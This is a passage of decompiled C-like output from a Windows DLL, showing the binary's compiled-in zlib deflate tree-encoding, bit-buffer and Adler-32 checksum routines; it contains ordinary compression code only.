          if ( v8 <= 16 - v7 )
          {
            v15 = *(_WORD *)(result + 4 * v6 + 2684) << v8;
            v16 = *(_DWORD *)(result + 5820);
            *(_WORD *)(result + 5816) |= v15;
            v14 = v7 + v16;
          }
          else
          {
            v9 = *(_WORD *)(result + 4 * v6 + 2684);
            v10 = v9 << v8;
            v11 = *(_DWORD *)(result + 8);
            *(_WORD *)(result + 5816) |= v10;
            *(_BYTE *)(v11 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
            *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
            v12 = *(_DWORD *)(result + 5820);
            ++*(_DWORD *)(result + 20);
            v13 = v9 >> (16 - v12);
            v14 = v12 + v7 - 16;
            v6 = v62;
            *(_WORD *)(result + 5816) = v13;
            v4 = v68;
          }
          --v4;
          *(_DWORD *)(result + 5820) = v14;
          v68 = v4;
        }
        while ( v4 );
      }
LABEL_40:
      v4 = 0;
      v61 = v6;
      if ( v67 )
      {
        if ( v6 != v67 )
        {
          v3 = 7;
          v59 = 4;
          goto LABEL_46;
        }
        v3 = 6;
      }
      else
      {
        v3 = 138;
      }
      v59 = 3;
LABEL_46:
      v5 = v59;
LABEL_47:
      v66 += 2;
    }
  }
  return result;
}

//----- (10038888) --------------------------------------------------------
int __usercall sub_10038888@<eax>(int a1@<eax>)
{
  int result; // eax

  sub_10038332(a1 + 148, *(_DWORD *)(a1 + 2844), (_WORD *)a1);
  sub_10038332(a1 + 2440, *(_DWORD *)(a1 + 2856), (_WORD *)a1);
  sub_1003814A((_DWORD *)a1, (int *)(a1 + 2864));
  for ( result = 18; result >= 3; --result )
  {
    if ( *(_WORD *)(a1 + 4 * (unsigned __int8)byte_10090264[result] + 2686) )
      break;
  }
  *(_DWORD *)(a1 + 5800) += 3 * result + 17;
  return result;
}

//----- (100388E9) --------------------------------------------------------
int __usercall sub_100388E9@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // ebx
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  int v16; // edx
  int i; // edi
  int v18; // ecx
  int v19; // edx
  unsigned __int16 v20; // si
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  int v24; // eax

  v4 = *(_DWORD *)(a1 + 5820);
  v5 = a4;
  if ( v4 <= 11 )
  {
    *(_WORD *)(a1 + 5816) |= (a2 - 257) << v4;
    *(_DWORD *)(a1 + 5820) = v4 + 5;
  }
  else
  {
    v6 = (a2 - 257) << v4;
    v7 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5816) |= v6;
    *(_BYTE *)(v7 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(++*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v8 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    v5 = a4;
    *(_DWORD *)(a1 + 5820) = v8 - 11;
    *(_WORD *)(a1 + 5816) = (unsigned __int16)(a2 - 257) >> (16 - v8);
  }
  v9 = *(_DWORD *)(a1 + 5820);
  if ( v9 <= 11 )
  {
    *(_WORD *)(a1 + 5816) |= (a3 - 1) << v9;
    *(_DWORD *)(a1 + 5820) = v9 + 5;
  }
  else
  {
    v10 = (a3 - 1) << v9;
    v11 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5816) |= v10;
    *(_BYTE *)(v11 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(++*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v12 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5820) = v12 - 11;
    *(_WORD *)(a1 + 5816) = (unsigned __int16)(a3 - 1) >> (16 - v12);
  }
  v13 = *(_DWORD *)(a1 + 5820);
  if ( v13 <= 12 )
  {
    *(_WORD *)(a1 + 5816) |= (v5 - 4) << v13;
    *(_DWORD *)(a1 + 5820) = v13 + 4;
  }
  else
  {
    v14 = (v5 - 4) << v13;
    v15 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5816) |= v14;
    *(_BYTE *)(v15 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(++*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v16 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5820) = v16 - 12;
    *(_WORD *)(a1 + 5816) = (unsigned __int16)(v5 - 4) >> (16 - v16);
  }
  for ( i = 0; i < v5; ++i )
  {
    v18 = *(_DWORD *)(a1 + 5820);
    v19 = (unsigned __int8)byte_10090264[i];
    if ( v18 <= 13 )
    {
      *(_WORD *)(a1 + 5816) |= *(_WORD *)(a1 + 4 * v19 + 2686) << v18;
      *(_DWORD *)(a1 + 5820) = v18 + 3;
    }
    else
    {
      v20 = *(_WORD *)(a1 + 4 * v19 + 2686);
      v21 = v20 << v18;
      v22 = *(_DWORD *)(a1 + 20);
      *(_WORD *)(a1 + 5816) |= v21;
      *(_BYTE *)(v22 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5816);
      *(_BYTE *)(++*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
      v23 = *(_DWORD *)(a1 + 5820);
      ++*(_DWORD *)(a1 + 20);
      v5 = a4;
      *(_DWORD *)(a1 + 5820) = v23 - 13;
      *(_WORD *)(a1 + 5816) = v20 >> (16 - v23);
    }
  }
  v24 = sub_100383EE(a1, a2 - 1, a1 + 148);
  return sub_100383EE(v24, a3 - 1, v24 + 2440);
}

//----- (10038B1F) --------------------------------------------------------
_DWORD *__usercall sub_10038B1F@<eax>(int a1@<eax>, int a2@<ecx>, _BYTE *a3, int a4)
{
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  int v8; // edx

  v5 = *(_DWORD *)(a1 + 5820);
  if ( v5 <= 13 )
  {
    *(_WORD *)(a1 + 5816) |= a2 << v5;
    *(_DWORD *)(a1 + 5820) = v5 + 3;
  }
  else
  {
    v6 = a2 << v5;
    v7 = *(_DWORD *)(a1 + 8);
    *(_WORD *)(a1 + 5816) |= v6;
    *(_BYTE *)(v7 + (*(_DWORD *)(a1 + 20))++) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v8 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5820) = v8 - 13;
    *(_WORD *)(a1 + 5816) = (unsigned __int16)a2 >> (16 - v8);
  }
  return sub_100394A8(a1, a3, a4);
}

//----- (10038B9F) --------------------------------------------------------
int __usercall sub_10038B9F@<eax>(int a1@<eax>)
{
  int v1; // ecx
  int v2; // edx
  int v3; // ecx
  int v4; // edx
  int result; // eax
  int v6; // ecx
  int v7; // edx
  int v8; // ecx
  int v9; // edx

  v1 = *(_DWORD *)(a1 + 5820);
  *(_WORD *)(a1 + 5816) |= 2 << v1;
  if ( v1 <= 13 )
  {
    *(_DWORD *)(a1 + 5820) = v1 + 3;
  }
  else
  {
    *(_BYTE *)(*(_DWORD *)(a1 + 8) + (*(_DWORD *)(a1 + 20))++) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v2 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5820) = v2 - 13;
    *(_WORD *)(a1 + 5816) = 2u >> (16 - v2);
  }
  v3 = *(_DWORD *)(a1 + 5820);
  *(_WORD *)(a1 + 5816) = *(_WORD *)(a1 + 5816);
  if ( v3 <= 9 )
  {
    *(_DWORD *)(a1 + 5820) = v3 + 7;
  }
  else
  {
    *(_BYTE *)(*(_DWORD *)(a1 + 8) + (*(_DWORD *)(a1 + 20))++) = *(_BYTE *)(a1 + 5816);
    *(_BYTE *)(*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5817);
    v4 = *(_DWORD *)(a1 + 5820);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5820) = v4 - 9;
    *(_WORD *)(a1 + 5816) = 0;
  }
  result = sub_100393E4(a1);
  v6 = *(_DWORD *)(result + 5820);
  if ( *(_DWORD *)(result + 5812) - v6 + 11 < 9 )
  {
    *(_WORD *)(result + 5816) |= 2 << v6;
    if ( v6 <= 13 )
    {
      *(_DWORD *)(result + 5820) = v6 + 3;
    }
    else
    {
      *(_BYTE *)(*(_DWORD *)(result + 8) + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
      *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
      v7 = *(_DWORD *)(result + 5820);
      ++*(_DWORD *)(result + 20);
      *(_DWORD *)(result + 5820) = v7 - 13;
      *(_WORD *)(result + 5816) = 2u >> (16 - v7);
    }
    v8 = *(_DWORD *)(result + 5820);
    *(_WORD *)(result + 5816) = *(_WORD *)(result + 5816);
    if ( v8 <= 9 )
    {
      *(_DWORD *)(result + 5820) = v8 + 7;
    }
    else
    {
      *(_BYTE *)(*(_DWORD *)(result + 8) + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
      *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
      v9 = *(_DWORD *)(result + 5820);
      ++*(_DWORD *)(result + 20);
      *(_DWORD *)(result + 5820) = v9 - 9;
      *(_WORD *)(result + 5816) = 0;
    }
    result = sub_100393E4(result);
  }
  *(_DWORD *)(result + 5812) = 7;
  return result;
}

//----- (10038D62) --------------------------------------------------------
int __usercall sub_10038D62@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<edi>, _BYTE *a4)
{
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  __int64 v9; // rax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int result; // eax
  int v19; // [esp+8h] [ebp-4h]

  v19 = 0;
  if ( *(int *)(a2 + 132) <= 0 )
  {
    v8 = a1 + 5;
LABEL_8:
    v7 = v8;
    goto LABEL_9;
  }
  if ( a1 && *(_DWORD *)(*(_DWORD *)a2 + 44) == 2 )
    sub_10039383(a2, (_WORD *)a2);
  sub_1003814A((_DWORD *)a2, (int *)(a2 + 2840));
  sub_1003814A((_DWORD *)a2, (int *)(a2 + 2852));
  v6 = sub_10038888(a2);
  v7 = (unsigned int)(*(_DWORD *)(a2 + 5800) + 10) >> 3;
  v8 = (unsigned int)(*(_DWORD *)(a2 + 5804) + 10) >> 3;
  v19 = v6;
  if ( v8 <= v7 )
    goto LABEL_8;
LABEL_9:
  if ( a1 + 4 <= v7 && a4 )
  {
    sub_10038B1F(a2, a3, a4, a1);
  }
  else if ( *(_DWORD *)(a2 + 136) == 4 || v8 == v7 )
  {
    v14 = *(_DWORD *)(a2 + 5820);
    if ( v14 <= 13 )
    {
      *(_WORD *)(a2 + 5816) |= (a3 + 2) << v14;
      *(_DWORD *)(a2 + 5820) = v14 + 3;
    }
    else
    {
      v15 = (a3 + 2) << v14;
      v16 = *(_DWORD *)(a2 + 20);
      *(_WORD *)(a2 + 5816) |= v15;
      *(_BYTE *)(*(_DWORD *)(a2 + 8) + v16) = *(_BYTE *)(a2 + 5816);
      *(_BYTE *)(++*(_DWORD *)(a2 + 20) + *(_DWORD *)(a2 + 8)) = *(_BYTE *)(a2 + 5817);
      v17 = *(_DWORD *)(a2 + 5820);
      ++*(_DWORD *)(a2 + 20);
      *(_DWORD *)(a2 + 5820) = v17 - 13;
      *(_WORD *)(a2 + 5816) = (unsigned __int16)(a3 + 2) >> (16 - v17);
    }
    sub_10038FD1(a2, (int)&unk_100923B8, (int)&unk_10092838);
  }
  else
  {
    v10 = *(_DWORD *)(a2 + 5820);
    if ( v10 <= 13 )
    {
      *(_WORD *)(a2 + 5816) |= (a3 + 4) << v10;
      *(_DWORD *)(a2 + 5820) = v10 + 3;
    }
    else
    {
      v11 = (a3 + 4) << v10;
      v12 = *(_DWORD *)(a2 + 20);
      *(_WORD *)(a2 + 5816) |= v11;
      *(_BYTE *)(*(_DWORD *)(a2 + 8) + v12) = *(_BYTE *)(a2 + 5816);
      *(_BYTE *)(++*(_DWORD *)(a2 + 20) + *(_DWORD *)(a2 + 8)) = *(_BYTE *)(a2 + 5817);
      v13 = *(_DWORD *)(a2 + 5820);
      ++*(_DWORD *)(a2 + 20);
      *(_DWORD *)(a2 + 5820) = v13 - 13;
      *(_WORD *)(a2 + 5816) = (unsigned __int16)(a3 + 4) >> (16 - v13);
    }
    sub_100388E9(a2, *(_DWORD *)(a2 + 2844) + 1, *(_DWORD *)(a2 + 2856) + 1, v19 + 1);
    sub_10038FD1(a2, a2 + 148, a2 + 2440);
  }
  LODWORD(v9) = a2;
  result = sub_10037E08(v9);
  if ( a3 )
    return sub_10039451(result);
  return result;
}
// 10038F37: variable 'v9' is possibly undefined

//----- (10038FD1) --------------------------------------------------------
int __usercall sub_10038FD1@<eax>(int result@<eax>, int a2, int a3)
{
  int v3; // ebx
  unsigned int v4; // ecx
  int v5; // edi
  int v6; // esi
  int v7; // ecx
  unsigned __int16 *v8; // esi
  int v9; // edi
  int v10; // esi
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // ebx
  int v18; // ecx
  unsigned __int16 v19; // di
  int v20; // edx
  int v21; // ecx
  int v22; // edx
  int v23; // ecx
  int v24; // ecx
  int v25; // esi
  int v26; // ecx
  int v27; // edx
  int v28; // ecx
  int v29; // edx
  int v30; // ecx
  unsigned int v31; // edi
  int v32; // ecx
  int v33; // esi
  unsigned __int16 *v34; // edx
  int v35; // ecx
  unsigned __int16 v36; // si
  int v37; // edx
  int v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v41; // edx
  unsigned int v42; // edi
  unsigned int v43; // edx
  int v44; // ecx
  int v45; // edx
  int v46; // edx
  int v47; // ecx
  unsigned __int16 v48; // si
  int v49; // edx
  int v50; // ecx
  int v51; // edx
  int v52; // ecx
  unsigned int v53; // [esp+Ch] [ebp-10h]
  int v54; // [esp+10h] [ebp-Ch]
  int v55; // [esp+14h] [ebp-8h]
  int v56; // [esp+14h] [ebp-8h]
  int v57; // [esp+18h] [ebp-4h]
  int v58; // [esp+18h] [ebp-4h]
  int v59; // [esp+18h] [ebp-4h]
  int v60; // [esp+18h] [ebp-4h]
  int v61; // [esp+24h] [ebp+8h]

  v3 = a2;
  v4 = 0;
  if ( *(_DWORD *)(result + 5792) )
  {
    do
    {
      v5 = *(unsigned __int16 *)(*(_DWORD *)(result + 5796) + 2 * v4);
      v6 = *(unsigned __int8 *)(v4 + *(_DWORD *)(result + 5784));
      v54 = v5;
      v53 = v4 + 1;
      if ( *(_WORD *)(*(_DWORD *)(result + 5796) + 2 * v4) )
      {
        v15 = (unsigned __int8)byte_10092AB0[v6];
        v57 = v15;
        v16 = *(unsigned __int16 *)(4 * v15 + v3 + 1030);
        v17 = 16 - v16;
        v55 = v16;
        v18 = *(_DWORD *)(result + 5820);
        if ( v18 <= v17 )
        {
          *(_WORD *)(result + 5816) |= *(_WORD *)(a2 + 4 * v15 + 1028) << v18;
          v23 = v55 + v18;
        }
        else
        {
          v19 = *(_WORD *)(a2 + 4 * v15 + 1028);
          v20 = v19 << v18;
          v21 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5816) |= v20;
          *(_BYTE *)(v21 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
          *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
          v22 = *(_DWORD *)(result + 5820);
          ++*(_DWORD *)(result + 20);
          v23 = v22 + v55 - 16;
          *(_WORD *)(result + 5816) = v19 >> (16 - v22);
          v5 = v54;
        }
        *(_DWORD *)(result + 5820) = v23;
        v24 = v57 * 4;
        v58 = dword_10092278[v57];
        if ( v58 )
        {
          v25 = v6 - *(int *)((char *)&dword_10092BB0 + v24);
          v26 = *(_DWORD *)(result + 5820);
          if ( v26 <= 16 - v58 )
          {
            *(_WORD *)(result + 5816) |= v25 << v26;
            v30 = v58 + v26;
          }
          else
          {
            v27 = v25 << v26;
            v28 = *(_DWORD *)(result + 8);
            *(_WORD *)(result + 5816) |= v27;
            *(_BYTE *)(v28 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
            *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
            v29 = *(_DWORD *)(result + 5820);
            ++*(_DWORD *)(result + 20);
            v30 = v29 + v58 - 16;
            *(_WORD *)(result + 5816) = (unsigned __int16)v25 >> (16 - v29);
          }
          *(_DWORD *)(result + 5820) = v30;
        }
        v31 = v5 - 1;
        if ( v31 >= 0x100 )
          v32 = (unsigned __int8)byte_100929B0[v31 >> 7];
        else
          v32 = (unsigned __int8)byte_100928B0[v31];
        v33 = 4 * v32;
        v34 = (unsigned __int16 *)(4 * v32 + a3);
        v56 = v34[1];
        v35 = *(_DWORD *)(result + 5820);
        v59 = v33;
        if ( v35 <= 16 - v56 )
        {
          *(_WORD *)(result + 5816) |= *v34 << v35;
          v40 = v56 + v35;
        }
        else
        {
          v36 = *v34;
          v37 = *v34 << v35;
          v38 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5816) |= v37;
          *(_BYTE *)(v38 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
          *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
          v39 = *(_DWORD *)(result + 5820);
          ++*(_DWORD *)(result + 20);
          v40 = v39 + v56 - 16;
          *(_WORD *)(result + 5816) = v36 >> (16 - v39);
          v33 = v59;
        }
        v3 = a2;
        *(_DWORD *)(result + 5820) = v40;
        v41 = *(int *)((char *)&dword_100922F0 + v33);
        v60 = v41;
        if ( !v41 )
          goto LABEL_25;
        v42 = v31 - *(int *)((char *)&dword_10092C28 + v33);
        if ( v40 <= 16 - v41 )
        {
          *(_WORD *)(result + 5816) |= v42 << v40;
          v14 = v41 + v40;
        }
        else
        {
          v43 = v42 << v40;
          v44 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5816) |= v43;
          *(_BYTE *)(v44 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
          *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
          v45 = *(_DWORD *)(result + 5820);
          ++*(_DWORD *)(result + 20);
          v14 = v45 + v60 - 16;
          *(_WORD *)(result + 5816) = (unsigned __int16)v42 >> (16 - v45);
        }
      }
      else
      {
        v7 = *(_DWORD *)(result + 5820);
        v8 = (unsigned __int16 *)(v3 + 4 * v6);
        v9 = v8[1];
        if ( v7 <= 16 - v9 )
        {
          *(_WORD *)(result + 5816) |= *v8 << v7;
          v14 = v9 + v7;
        }
        else
        {
          v10 = *v8;
          v11 = v10 << v7;
          v12 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5816) |= v11;
          *(_BYTE *)(v12 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
          *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
          v13 = *(_DWORD *)(result + 5820);
          ++*(_DWORD *)(result + 20);
          v3 = a2;
          v14 = v13 + v9 - 16;
          *(_WORD *)(result + 5816) = (unsigned __int16)v10 >> (16 - v13);
        }
      }
      *(_DWORD *)(result + 5820) = v14;
LABEL_25:
      v4 = v53;
    }
    while ( v53 < *(_DWORD *)(result + 5792) );
  }
  v46 = *(unsigned __int16 *)(v3 + 1026);
  v47 = *(_DWORD *)(result + 5820);
  v61 = v46;
  if ( v47 <= 16 - v46 )
  {
    *(_WORD *)(result + 5816) |= *(_WORD *)(v3 + 1024) << v47;
    v52 = v46 + v47;
  }
  else
  {
    v48 = *(_WORD *)(v3 + 1024);
    v49 = v48 << v47;
    v50 = *(_DWORD *)(result + 8);
    *(_WORD *)(result + 5816) |= v49;
    *(_BYTE *)(v50 + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
    *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
    v51 = *(_DWORD *)(result + 5820);
    ++*(_DWORD *)(result + 20);
    v52 = v51 + v61 - 16;
    *(_WORD *)(result + 5816) = v48 >> (16 - v51);
  }
  *(_DWORD *)(result + 5820) = v52;
  *(_DWORD *)(result + 5812) = *(unsigned __int16 *)(v3 + 1026);
  return result;
}
// 10092278: using guessed type int dword_10092278[];
// 100922F0: using guessed type int dword_100922F0;
// 10092BB0: using guessed type int dword_10092BB0;
// 10092C28: using guessed type int dword_10092C28;

//----- (10039383) --------------------------------------------------------
int __fastcall sub_10039383(int a1, _WORD *a2)
{
  int v2; // eax
  _WORD *v3; // ecx
  _WORD *v4; // ecx
  bool v5; // zf
  int result; // eax

  v2 = 0;
  v3 = a2 + 74;
  do
  {
    if ( *v3 )
      break;
    ++v2;
    v3 += 2;
  }
  while ( v2 < 9 );
  if ( v2 == 9 )
  {
    v2 = 14;
    v4 = a2 + 102;
    do
    {
      if ( *v4 )
        break;
      ++v2;
      v4 += 2;
    }
    while ( v2 < 32 );
  }
  v5 = v2 == 32;
  result = *(_DWORD *)a2;
  *(_DWORD *)(*(_DWORD *)a2 + 44) = v5;
  return result;
}

//----- (100393C5) --------------------------------------------------------
unsigned int __cdecl sub_100393C5(unsigned int a1, int a2)
{
  unsigned int v2; // eax
  char v3; // cl

  v2 = 0;
  do
  {
    v3 = a1;
    a1 >>= 1;
    v2 = 2 * (v3 & 1 | v2);
    --a2;
  }
  while ( a2 > 0 );
  return v2 >> 1;
}

//----- (100393E4) --------------------------------------------------------
int __usercall sub_100393E4@<eax>(int result@<eax>)
{
  int v1; // ecx
  __int16 v2; // dx

  v1 = *(_DWORD *)(result + 5820);
  if ( v1 == 16 )
  {
    *(_BYTE *)(*(_DWORD *)(result + 8) + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
    *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
    ++*(_DWORD *)(result + 20);
    *(_WORD *)(result + 5816) = 0;
    *(_DWORD *)(result + 5820) = 0;
  }
  else if ( v1 >= 8 )
  {
    *(_BYTE *)(*(_DWORD *)(result + 8) + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5816);
    v2 = *(unsigned __int8 *)(result + 5817);
    ++*(_DWORD *)(result + 20);
    *(_DWORD *)(result + 5820) -= 8;
    *(_WORD *)(result + 5816) = v2;
  }
  return result;
}

//----- (10039451) --------------------------------------------------------
int __usercall sub_10039451@<eax>(int result@<eax>)
{
  int v1; // ecx

  v1 = *(_DWORD *)(result + 5820);
  if ( v1 > 8 )
  {
    *(_BYTE *)(*(_DWORD *)(result + 8) + (*(_DWORD *)(result + 20))++) = *(_BYTE *)(result + 5816);
    *(_BYTE *)(*(_DWORD *)(result + 20) + *(_DWORD *)(result + 8)) = *(_BYTE *)(result + 5817);
LABEL_5:
    ++*(_DWORD *)(result + 20);
    goto LABEL_6;
  }
  if ( v1 > 0 )
  {
    *(_BYTE *)(*(_DWORD *)(result + 8) + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5816);
    goto LABEL_5;
  }
LABEL_6:
  *(_WORD *)(result + 5816) = 0;
  *(_DWORD *)(result + 5820) = 0;
  return result;
}

//----- (100394A8) --------------------------------------------------------
_DWORD *__usercall sub_100394A8@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _DWORD *result; // eax
  int v6; // ecx
  int v7; // edx

  result = (_DWORD *)sub_10039451(a1);
  v6 = result[5];
  v7 = result[2];
  result[1453] = 8;
  *(_BYTE *)(v6 + v7) = a3;
  *(_BYTE *)(++result[5] + result[2]) = BYTE1(a3);
  *(_BYTE *)(++result[5] + result[2]) = ~(_BYTE)a3;
  *(_BYTE *)(++result[5] + result[2]) = (unsigned __int16)~(_WORD)a3 >> 8;
  ++result[5];
  while ( a3 )
  {
    --a3;
    *(_BYTE *)(result[5] + result[2]) = *a2;
    ++result[5];
    ++a2;
  }
  return result;
}

//----- (10039510) --------------------------------------------------------
int __usercall sub_10039510@<eax>(unsigned int a1@<eax>, unsigned __int8 *a2@<ecx>, unsigned int a3)
{
  unsigned int v3; // ebx
  int result; // eax
  unsigned int v5; // edi
  int v7; // eax
  unsigned int v8; // esi
  unsigned int v9; // edi
  unsigned int v10; // esi
  unsigned int v11; // edi
  unsigned int v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // esi
  unsigned int v15; // edi
  unsigned int v16; // esi
  unsigned int v17; // edi
  unsigned int v18; // esi
  unsigned int v19; // edi
  unsigned int v20; // esi
  unsigned int v21; // edi
  unsigned int v22; // esi
  unsigned int v23; // edi
  unsigned int v24; // esi
  int v25; // edi
  int v26; // esi
  int v27; // edi
  int v28; // esi
  int v29; // edi
  int v30; // esi
  int v31; // edi
  int v32; // esi
  int v33; // edi
  int v34; // esi
  int v35; // edi
  int v36; // esi
  int v37; // edi
  bool v38; // zf
  unsigned int v39; // eax
  unsigned int v40; // esi
  unsigned int v41; // edi
  unsigned int v42; // esi
  unsigned int v43; // edi
  unsigned int v44; // esi
  unsigned int v45; // edi
  unsigned int v46; // esi
  unsigned int v47; // edi
  unsigned int v48; // esi
  unsigned int v49; // edi
  unsigned int v50; // esi
  unsigned int v51; // edi
  unsigned int v52; // esi
  unsigned int v53; // edi
  unsigned int v54; // esi
  unsigned int v55; // edi
  unsigned int v56; // esi
  int v57; // edi
  int v58; // esi
  int v59; // edi
  int v60; // esi
  int v61; // edi
  int v62; // esi
  int v63; // edi
  int v64; // esi
  int v65; // edi
  int v66; // esi
  int v67; // edi
  int v68; // esi
  int v69; // edi
  unsigned int v70; // eax
  unsigned int v71; // [esp+Ch] [ebp-4h]

  v3 = a3;
  result = 1;
  v5 = HIWORD(a1);
  a1 = (unsigned __int16)a1;
  if ( a3 == 1 )
  {
    a1 = *a2 + (unsigned __int16)a1;
    if ( a1 >= 0xFFF1 )
      a1 -= 65521;
    v5 += a1;
    if ( v5 >= 0xFFF1 )
      v5 -= 65521;
  }
  else
  {
    if ( !a2 )
      return result;
    if ( a3 < 0x10 )
    {
      while ( v3 )
      {
        --v3;
        a1 += *a2++;
        v5 += a1;
      }
      if ( a1 >= 0xFFF1 )
        a1 -= 65521;
      v70 = v5 % 0xFFF1;
      return a1 | (v70 << 16);
    }
    if ( a3 >= 0x15B0 )
    {
      v3 = a3;
      v71 = a3 / 0x15B0;
      do
      {
        v3 -= 5552;
        v7 = 347;
        do
        {
          v8 = *a2 + a1;
          v9 = v8 + v5;
          v10 = a2[1] + v8;
          v11 = v10 + v9;
          v12 = a2[2] + v10;
          v13 = v12 + v11;
          v14 = a2[3] + v12;
          v15 = v14 + v13;
          v16 = a2[4] + v14;
          v17 = v16 + v15;
          v18 = a2[5] + v16;
          v19 = v18 + v17;
          v20 = a2[6] + v18;
          v21 = v20 + v19;
          v22 = a2[7] + v20;
          v23 = v22 + v21;
          v24 = a2[8] + v22;
          v25 = v24 + v23;
          v26 = a2[9] + v24;
          v27 = v26 + v25;
          v28 = a2[10] + v26;
          v29 = v28 + v27;
          v30 = a2[11] + v28;
          v31 = v30 + v29;
          v32 = a2[12] + v30;
          v33 = v32 + v31;
          v34 = a2[13] + v32;
          v35 = v34 + v33;
          v36 = a2[14] + v34;
          v37 = v36 + v35;
          a1 = a2[15] + v36;
          v5 = a1 + v37;
          a2 += 16;
          --v7;
        }
        while ( v7 );
        a1 %= 0xFFF1u;
        v38 = v71-- == 1;
        v5 %= 0xFFF1u;
      }
      while ( !v38 );
    }
    if ( v3 )
    {
      if ( v3 >= 0x10 )
      {
        v39 = v3 >> 4;
        do
        {
          v40 = *a2 + a1;
          v41 = v40 + v5;
          v42 = a2[1] + v40;
          v43 = v42 + v41;
          v44 = a2[2] + v42;
          v45 = v44 + v43;
          v46 = a2[3] + v44;
          v47 = v46 + v45;
          v48 = a2[4] + v46;
          v49 = v48 + v47;
          v50 = a2[5] + v48;
          v51 = v50 + v49;
          v52 = a2[6] + v50;
          v53 = v52 + v51;
          v54 = a2[7] + v52;
          v55 = v54 + v53;
          v56 = a2[8] + v54;
          v57 = v56 + v55;
          v58 = a2[9] + v56;
          v59 = v58 + v57;
          v60 = a2[10] + v58;
          v61 = v60 + v59;
          v62 = a2[11] + v60;
          v63 = v62 + v61;
          v64 = a2[12] + v62;
          v65 = v64 + v63;
          v66 = a2[13] + v64;
          v67 = v66 + v65;
          v68 = a2[14] + v66;
          v69 = v68 + v67;
          a1 = a2[15] + v68;
          v3 -= 16;
          v5 = a1 + v69;
